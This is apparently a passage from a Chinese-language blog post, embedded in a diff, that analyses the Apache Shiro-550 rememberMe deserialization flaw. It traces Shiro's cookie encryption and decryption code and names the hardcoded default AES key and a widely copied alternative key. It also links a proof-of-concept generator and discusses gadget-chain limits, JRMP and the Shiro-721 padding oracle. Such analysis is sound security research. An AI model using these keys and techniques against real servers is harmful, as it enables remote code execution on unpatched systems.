class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先看  <code>getEncryptionCipherKey</code> 方法的调用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey</span></span><br><span class="line"><span class="comment">* 这里的 this.encryptionCipherKey 是之前类初始化的时候就定义的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] getEncryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.encryptionCipherKey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 回顾类的初始化</span></span><br><span class="line"><span class="comment">* org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager</span></span><br><span class="line"><span class="comment">* 注意 DEFAULT_CIPHER_KEY_BYTES，其实是之前 private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;); 已经硬编码好的。 这是漏洞的根源</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCipherKey</span><span class="params">(<span class="keyword">byte</span>[] cipherKey)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setEncryptionCipherKey(cipherKey);</span><br><span class="line">    <span class="keyword">this</span>.setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEncryptionCipherKey</span><span class="params">(<span class="keyword">byte</span>[] encryptionCipherKey)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二部分 然后是 <code>encrypt</code> 方法 （核心 AES 加密）</p>
+<p>传入的两个参数一个是刚刚在 <code>org.apache.shiro.io.DefaultSerializer#serialize</code> 的 <code>toByteArray</code>  返回的字节码。另一个就是 AES KEY</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205232236114.png" alt="image-20201205232236114"></p>
+<p>后面的就是 AES 加密的过程， 最后会返回一个 bytes</p>
+<p>第三部分</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 返回 org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</span></span><br><span class="line"><span class="comment">* bytes 返回两个参数经过 encrypt 加密的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</span></span><br><span class="line"><span class="comment">* base64 加密</span></span><br><span class="line"><span class="comment">* 设置 cookie </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="keyword">byte</span>[] serialized)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        ······</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">        String base64 = Base64.encodeToString(serialized);</span><br><span class="line">        Cookie template = <span class="keyword">this</span>.getCookie();</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> SimpleCookie(template);</span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205234932955.png" alt="image-20201205234932955"></p>
+<p>完成了 序列化对象 -&gt; AES 加密 -&gt; Base64 加密 -&gt; 设置 cookie 值 的过程</p>
+<h2 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h2><p>POC 生成：<a target="_blank" rel="noopener" href="https://github.com/P2hm1n/vulnExploit/blob/main/shiro_rememberMe_generate.py">https://github.com/P2hm1n/vulnExploit/blob/main/shiro_rememberMe_generate.py</a></p>
+<p>从 POC 的触发来看解密流程</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">getRememberedIdentity</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    RememberMeManager rmm = <span class="keyword">this</span>.getRememberMeManager();</span><br><span class="line">    <span class="keyword">if</span> (rmm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">    ···</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 上面 return 调用 org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PrincipalCollection <span class="title">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    PrincipalCollection principals = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.getRememberedSerializedIdentity(subjectContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 上面调用 org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">    ···</span><br><span class="line">            String base64 = <span class="keyword">this</span>.getCookie().readValue(request, response);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 上面调用 org.apache.shiro.web.servlet.SimpleCookie#readValue</span></span><br><span class="line"><span class="comment">* 关键函数 readValue 返回 rememberMe 的 POC 值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">readValue</span><span class="params">(HttpServletRequest request, HttpServletResponse ignored)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取到了传入的 cookie 的名字 name: &quot;rememberMe&quot;</span></span><br><span class="line">    String name = <span class="keyword">this</span>.getName();</span><br><span class="line">    String value = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 这里获取到 rememberMe 对应的值</span></span><br><span class="line">    javax.servlet.http.Cookie cookie = getCookie(request, name);</span><br><span class="line">    <span class="keyword">if</span> (cookie != <span class="keyword">null</span>) &#123;</span><br><span class="line">        value = cookie.getValue();</span><br><span class="line">        log.debug(<span class="string">&quot;Found &#x27;&#123;&#125;&#x27; cookie value [&#123;&#125;]&quot;</span>, name, value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;No &#x27;&#123;&#125;&#x27; cookie value&quot;</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回 rememberMe 的值</span></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 跳回 org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</span></span><br><span class="line"><span class="comment">* 关键点：会进行base64解码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">    ···</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;deleteMe&quot;</span>.equals(base64)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 确实是否是base64</span></span><br><span class="line">                base64 = <span class="keyword">this</span>.ensurePadding(base64);</span><br><span class="line">            ···</span><br><span class="line">                <span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">            ···</span><br><span class="line">                <span class="keyword">return</span> decoded;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 跳回 org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</span></span><br><span class="line"><span class="comment">* 此时已经将 base64 进行了解码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> PrincipalCollection <span class="title">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    ···</span><br><span class="line">            principals = <span class="keyword">this</span>.convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 调用 org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 调用 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</span></span><br><span class="line"><span class="comment">* 关键点： 进行 AES 解密， 并返回解密值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 返回 org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</span></span><br><span class="line"><span class="comment">* 此处调用 deserialize</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">  ···</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 调用 org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] serializedIdentity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (PrincipalCollection)<span class="keyword">this</span>.getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 调用 org.apache.shiro.io.DefaultSerializer#deserialize</span></span><br><span class="line"><span class="comment">* 最终关键点：进行反序列化</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="keyword">null</span>) &#123;</span><br><span class="line">        String msg = <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(bais);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ClassResolvingObjectInputStream(bis);</span><br><span class="line">            T deserialized = ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="keyword">return</span> deserialized;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            String msg = <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(msg, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以下是几个关键点截图：</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216012419243.png" alt="image-20201216012419243"></p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216012229514.png" alt="image-20201216012229514"></p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216011528037.png" alt="image-20201216011528037"></p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216011918348.png" alt="image-20201216011918348"></p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p>
+<p>硬编码  -&gt;  随机值</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205223500139.png" alt="image-20201205223500139"></p>
+<h1 id="利用限制、坑点及思考"><a href="#利用限制、坑点及思考" class="headerlink" title="利用限制、坑点及思考"></a>利用限制、坑点及思考</h1><h2 id="为什么-100key-能用"><a href="#为什么-100key-能用" class="headerlink" title="为什么 100key 能用"></a>为什么 100key 能用</h2><p>各种 shiro exploit 似乎都在集成一个爆破 key 的功能。但是根据漏洞可以看出 1.2.4 的 key 是硬编码的，然后 1.2.5 之后变成了随机值。key 值爆破似乎跟两个版本没有什么关系。</p>
+<p>对 shiro 的了解和研究并不深刻，这个问题的答案来源于：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw">关于Shiro反序列化漏洞的延伸—升级shiro也能被shell</a></p>
+<blockquote>
+<p>可能性1：有其他开源框架整合了shiro，并且有这样一段配置文件，大家就都直接用了。</p>
+<p>可能性2：因为这种代码都是互相抄来抄去的，在博客里，教程里，github里有这个代码，开发直接拿过来用。</p>
+</blockquote>
+<p>Forexampe: ShiroConfig</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cookie管理对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CookieRememberMeManager <span class="title">rememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  CookieRememberMeManager cookieRememberMeManager = <span class="keyword">new</span> CookieRememberMeManager();</span><br><span class="line">  cookieRememberMeManager.setCookie(rememberMeCookie());</span><br><span class="line">  <span class="comment">// rememberMe cookie加密的密钥</span></span><br><span class="line">  cookieRememberMeManager.setCipherKey(Base64.decode(<span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line">  <span class="keyword">return</span> cookieRememberMeManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="为什么有的链打不了"><a href="#为什么有的链打不了" class="headerlink" title="为什么有的链打不了"></a>为什么有的链打不了</h2><p>这个在身边的 @p1g3 和 @l3yx 的博客中都阐述的很详细了。</p>
+<p>简而言之就是 <code>org.apache.shiro.io.DefaultSerializer#deserialize</code> 中调用 的 <code>ClassResolvingObjectInputStream</code> 重写了 <code>resolveClass</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (serialized == <span class="keyword">null</span>) &#123;</span><br><span class="line">    String msg = <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(msg);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">    BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(bais);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      ObjectInputStream ois = <span class="keyword">new</span> ClassResolvingObjectInputStream(bis);</span><br><span class="line">      T deserialized = ois.readObject();</span><br><span class="line">      ois.close();</span><br><span class="line">      <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">      String msg = <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(msg, var6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看一下 <code>org.apache.shiro.io.ClassResolvingObjectInputStream</code> 是怎么写的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.apache.shiro.io;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ClassUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.UnknownClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassResolvingObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassResolvingObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Compare to <code>java.io.ObjectInputStream#resolveClass</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; resolveClass(ObjectStreamClass objectStreamClass) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    String name = objectStreamClass.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        ClassNotFoundException classNotFoundException = e;</span><br><span class="line">        Class&lt;?&gt; cls = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cls;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> classNotFoundException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Shiro 中使用了 <code>ClassUtils.forName</code> 而原生的使用的 <code>Class.forName</code></p>
+<p>具体区别跟进  <code>ClassUtils.forName</code> </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">forName</span><span class="params">(String fqcn)</span> <span class="keyword">throws</span> UnknownClassException </span>&#123;</span><br><span class="line">  Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">  <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">      log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">      log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the current ClassLoader.  &quot;</span> + <span class="string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    String msg = <span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context, current, or &quot;</span> + <span class="string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnknownClassException(msg);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直观可以看到的是里面大多采用了 <code>loadClass</code> 来加载。至于使用其加载类有什么弊端可以看 @p1g3 这段话</p>
+<blockquote>
+<p>ClassLoader.loadClass的方式并不支持加载数组类，这也是为什么cc没法用的原因，当然这部分我并没有深入分析，因为其涉及到了Java中一种叫”双亲委派”的类加载思路 &amp; 突破”双亲委派”的思路，这部分和漏洞无关</p>
+<p>此时我们则无法使用任何带数组对象的gadget，而cc3.2.1中的所有链（在官方仓库内的）都需要用到数组对象transformer，所以需要重新构造链，用其他链来打。</p>
+</blockquote>
+<p>大概小结：</p>
+<blockquote>
+<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
+</blockquote>
+<p>至于 <code>ClassLoader.loadClass</code> 是不是所有 class 都无法加载？</p>
+<p>参考下一小标题</p>
+<h2 id="延伸-resovleClass-的数组类加载"><a href="#延伸-resovleClass-的数组类加载" class="headerlink" title="延伸 - resovleClass 的数组类加载"></a>延伸 - resovleClass 的数组类加载</h2><p>在 P牛圈子中有个师傅文章 看到了这一点，对于上一个小标题中总结的 <code>ClassLoader.loadClass</code>不支持装载数组类型的class 有了全新的看法。</p>
+<p><code>[Ljava.lang.StackTraceElement</code>  数组类加载</p>
+<p>先留个坑，CC调完回来写</p>
+<h2 id="JRMP-攻击"><a href="#JRMP-攻击" class="headerlink" title="JRMP 攻击"></a>JRMP 攻击</h2><ul>
+<li>优点<ul>
+<li>不需要依赖</li>
+</ul>
+</li>
+<li>缺点<ul>
+<li>JEP290（受限 JDK 版本）:    <a target="_blank" rel="noopener" href="https://paper.seebug.org/454/">https://paper.seebug.org/454/</a></li>
+<li>需要出网</li>
+</ul>
+</li>
+</ul>
+<h2 id="分析思考"><a href="#分析思考" class="headerlink" title="分析思考"></a>分析思考</h2><p>匆匆分析完了 Shiro550。除了加解密流程跟 POC 的编写外似乎并没有分析太多东西。由于对 AES 的理解不足直接在加解密过程中直接忽略了 AES 的具体步骤。感觉这样浅尝辄止的分析不是太好。因此在下一次分析的时候要具体细化一下。</p>
+<p>前文中提到了 <code>resovleClass</code> 对 Shiro 利用链的限制，那么什么链可以使用，该如何去构造新的链，是我们值得深思的问题。先留个坑，准备去理一下 CommonsCollections gadget chain</p>
+<h2 id="Shiro-721-PaddingOracle-CBC-Attack"><a href="#Shiro-721-PaddingOracle-CBC-Attack" class="headerlink" title="Shiro-721 PaddingOracle CBC Attack"></a>Shiro-721 PaddingOracle CBC Attack</h2><p>Shiro-721 PaddingOracle CBC Attack</p>
+<p>个人总结漏洞原理以下几点：</p>
+<ol>
+<li>rememberMe 加解密原理</li>
+<li>Shiro 1.4.1及其之前版本的Cookie中的rememberMe字段是使用AES-128-CBC模式来加密生成的</li>
+</ol>
+<p>限制：</p>
+<ol>
+<li>Apache Shiro &lt;= 1.4.1</li>
+<li>需要有正常用户登录的 Cookie rememberMe</li>
+</ol>
+<p>涉及到密码算法，且实际利用有限。不在本文分析范围</p>
